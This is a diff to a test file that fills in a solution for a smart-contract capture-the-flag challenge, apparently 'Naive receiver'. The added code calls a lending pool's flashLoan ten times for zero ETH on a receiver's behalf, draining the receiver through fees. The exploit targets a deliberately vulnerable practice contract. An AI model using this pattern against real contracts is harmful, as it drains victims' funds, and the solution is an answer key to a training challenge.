@@ -37,7 +37,19 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const eth_address = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
+        const eth_amount_to_lend = 0;
+
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
+        await pool.flashLoan(receiver.address, eth_address, eth_amount_to_lend, '0x');
     });
 
     after(async function () {
